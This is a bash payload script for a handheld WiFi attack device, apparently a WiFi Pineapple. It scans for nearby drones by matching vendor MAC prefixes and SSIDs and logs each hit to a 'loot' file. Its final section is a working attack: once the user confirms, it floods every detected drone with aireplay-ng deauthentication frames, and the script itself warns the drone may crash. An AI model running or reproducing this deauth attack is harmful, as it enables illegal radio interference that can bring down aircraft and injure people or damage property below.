#!/bin/bash
# Title: Drone Hunter
# Author: bad-antics
# Description: Detect and identify nearby drones by WiFi
# Category: nullsec/recon

# Known drone OUIs and SSIDs
DRONE_OUIS="60:60:1F:DJI
34:D2:62:DJI
48:1C:B9:DJI
60:B6:47:DJI
E0:49:4C:DJI
40:1C:A8:Parrot
90:03:B7:Parrot
A0:14:3D:Parrot
00:12:1C:Parrot
00:26:7E:Parrot
94:51:03:Autel
90:3A:E6:Autel
2C:41:A1:Yuneec
60:A4:4C:Skydio
9C:4E:36:Holy Stone
A0:C9:A0:Syma
4C:49:E3:Autel"

DRONE_SSIDS="Spark-|Mavic-|Phantom|TELLO-|Anafi-|Bebop|PARROT|DJI|Skydio|YUNEEC|AUTEL"

PROMPT "DRONE HUNTER

Detect drones by their
WiFi signatures.

Identifies DJI, Parrot,
Autel, Yuneec, and more.

Press OK to continue."

INTERFACE="wlan0"

# Prepare
airmon-ng check kill 2>/dev/null
sleep 1
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

DURATION=$(NUMBER_PICKER "Scan time (sec):" 30)

SPINNER_START "Scanning for drones..."

# Scan
TEMP_DIR="/tmp/dronehunt_$$"
mkdir -p "$TEMP_DIR"
timeout $DURATION airodump-ng $MON_IF -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
sleep $DURATION

SPINNER_STOP

# Parse for drones
LOOT_DIR="/mmc/nullsec/drones"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/drones_$(date +%Y%m%d_%H%M%S).txt"

echo "Drone Hunter Results" > "$LOOT_FILE"
echo "Date: $(date)" >> "$LOOT_FILE"
echo "Scan Duration: ${DURATION}s" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

FOUND=0

# Check by OUI
while IFS=',' read -r BSSID F2 F3 CHANNEL F5 SPEED PRIVACY CIPHER AUTH POWER F11 F12 F13 ESSID REST; do
    BSSID=$(echo "$BSSID" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
    ESSID=$(echo "$ESSID" | tr -d ' ')
    
    if [ -n "$BSSID" ] && echo "$BSSID" | grep -qE "^[0-9A-Fa-f]{2}:"; then
        OUI=$(echo "$BSSID" | cut -d':' -f1-3)
        
        # Check OUI
        DRONE_TYPE=""
        if echo "$DRONE_OUIS" | grep -qi "$OUI"; then
            DRONE_TYPE=$(echo "$DRONE_OUIS" | grep -i "$OUI" | cut -d':' -f4)
        fi
        
        # Check SSID
        if [ -z "$DRONE_TYPE" ] && echo "$ESSID" | grep -qiE "$DRONE_SSIDS"; then
            if echo "$ESSID" | grep -qi "DJI\|Spark\|Mavic\|Phantom\|TELLO"; then
                DRONE_TYPE="DJI"
            elif echo "$ESSID" | grep -qi "Parrot\|Anafi\|Bebop"; then
                DRONE_TYPE="Parrot"
            elif echo "$ESSID" | grep -qi "AUTEL"; then
                DRONE_TYPE="Autel"
            elif echo "$ESSID" | grep -qi "YUNEEC"; then
                DRONE_TYPE="Yuneec"
            elif echo "$ESSID" | grep -qi "Skydio"; then
                DRONE_TYPE="Skydio"
            else
                DRONE_TYPE="Unknown"
            fi
        fi
        
        if [ -n "$DRONE_TYPE" ]; then
            echo "" >> "$LOOT_FILE"
            echo "DRONE DETECTED!" >> "$LOOT_FILE"
            echo "Type: $DRONE_TYPE" >> "$LOOT_FILE"
            echo "BSSID: $BSSID" >> "$LOOT_FILE"
            echo "SSID: $ESSID" >> "$LOOT_FILE"
            echo "Channel: $CHANNEL" >> "$LOOT_FILE"
            echo "Signal: $POWER dBm" >> "$LOOT_FILE"
            ((FOUND++))
        fi
    fi
done < "$TEMP_DIR/scan-01.csv"

# Cleanup
airmon-ng stop $MON_IF 2>/dev/null
rm -rf "$TEMP_DIR"

if [ "$FOUND" -gt 0 ]; then
    PROMPT "DRONES FOUND: $FOUND

Check $LOOT_FILE
for details.

Detected types may include
DJI, Parrot, Autel, etc.

Press OK to continue."
    
    resp=$(CONFIRMATION_DIALOG "DEAUTH DRONES?

This will disconnect
all detected drones
from their controllers.

WARNING: Dangerous!
Drone may crash.

Confirm?")
    
    if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        airmon-ng start $INTERFACE >/dev/null 2>&1
        LOG "Deauthing drones..."
        
        grep "BSSID:" "$LOOT_FILE" | cut -d':' -f2- | tr -d ' ' | while read DRONE_MAC; do
            aireplay-ng --deauth 50 -a "$DRONE_MAC" $MON_IF >/dev/null 2>&1 &
        done
        
        sleep 10
        killall aireplay-ng 2>/dev/null
        airmon-ng stop $MON_IF 2>/dev/null
        
        PROMPT "DEAUTH COMPLETE

All detected drones
have been targeted.

Press OK to exit."
    fi
else
    PROMPT "NO DRONES FOUND

No drone WiFi signals
detected in ${DURATION}s scan.

Try longer scan or
different location.

Press OK to exit."
fi
